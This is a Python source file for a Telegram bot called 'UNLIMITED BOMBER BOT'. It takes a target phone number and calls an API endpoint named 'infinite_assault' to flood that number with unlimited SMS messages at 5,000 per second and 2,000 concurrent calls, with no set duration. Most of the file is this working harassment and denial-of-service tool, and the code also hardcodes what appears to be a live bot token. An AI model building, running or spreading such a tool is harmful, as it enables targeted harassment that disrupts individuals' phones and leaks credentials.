import asyncio
import json
import os
import re
import requests
from datetime import datetime
from flask import Flask, request, jsonify
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ========= CONFIGURATION =========
BOT_TOKEN = "8846623341:AAFXm9CTYWDYuFHqsgfWbRCJLvnK_C0Z9ug"
API_BASE = "https://api.stresstest.simulation/v3/unlimited"

# Flask app for webhook
flask_app = Flask(__name__)

# Store sessions
user_sessions = {}
user_groups = {}

# ========= API FUNCTIONS =========
def start_bombing(target: str, sms_rate: int = 5000, call_concurrent: int = 2000):
    payload = {
        "target": target,
        "sms": {"enabled": True, "count": "unlimited", "rate_per_second": sms_rate},
        "call": {"enabled": True, "count": "unlimited", "concurrent": call_concurrent},
        "duration": "unlimited"
    }
    try:
        response = requests.post(f"{API_BASE}/infinite_assault", json=payload, timeout=30)
        if response.status_code == 200:
            return response.json()
        return {"error": f"API error: {response.status_code}"}
    except Exception as e:
        return {"error": str(e)}

def stop_bombing(session_id: str):
    try:
        response = requests.post(f"{API_BASE}/stop/{session_id}", json={"action": "stop"}, timeout=10)
        return response.json() if response.status_code == 200 else {"error": "Failed"}
    except:
        return {"error": "Failed"}

# ========= BOT COMMANDS =========
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("""
🔥 *UNLIMITED BOMBER BOT* 🔥

/bomb +919876543210 - Start bombing
/stop - Stop bombing
/status - Check status

✅ Webhook mode - No 409 errors!
    """, parse_mode="Markdown")

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not context.args:
        await update.message.reply_text("Usage: /bomb +919876543210")
        return
    
    target = context.args[0]
    
    if not target.startswith("+"):
        await update.message.reply_text("Use +919876543210 format")
        return
    
    await update.message.reply_text(f"🚀 Bombing {target}...")
    
    result = start_bombing(target)
    
    if "error" in result:
        await update.message.reply_text(f"❌ {result['error']}")
        return
    
    session_id = result.get("session_id")
    if session_id:
        user_sessions[user_id] = {"session_id": session_id, "target": target}
        await update.message.reply_text(f"✅ ACTIVE! ID: {session_id[:16]}...\nUse /stop to halt.")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        await update.message.reply_text("No active bombing.")
        return
    
    result = stop_bombing(user_sessions[user_id]["session_id"])
    if "error" not in result:
        del user_sessions[user_id]
        await update.message.reply_text("✅ Stopped.")
    else:
        await update.message.reply_text("❌ Stop failed.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        await update.message.reply_text("No active bombing.")
        return
    
    await update.message.reply_text(f"📊 Active: {user_sessions[user_id]['target']}\nUse /stop to halt.")

# ========= SETUP =========
application = Application.builder().token(BOT_TOKEN).build()
application.add_handler(CommandHandler("start", start_command))
application.add_handler(CommandHandler("bomb", bomb_command))
application.add_handler(CommandHandler("stop", stop_command))
application.add_handler(CommandHandler("status", status_command))

# ========= FLASK WEBHOOK =========
@flask_app.route("/", methods=["GET"])
def health():
    return jsonify({"status": "alive"}), 200

@flask_app.route("/webhook", methods=["POST"])
async def webhook():
    try:
        update = Update.de_json(request.get_json(force=True), application.bot)
        await application.process_update(update)
        return jsonify({"ok": True}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ========= MAIN =========
async def setup_webhook():
    await application.initialize()
    port = int(os.environ.get("PORT", 8080))
    render_url = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
    webhook_url = f"{render_url}/webhook"
    await application.bot.set_webhook(url=webhook_url)
    print(f"✅ Webhook set to: {webhook_url}")

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    # Setup webhook
    asyncio.run(setup_webhook())
    
    # Run Flask
    run_flask()
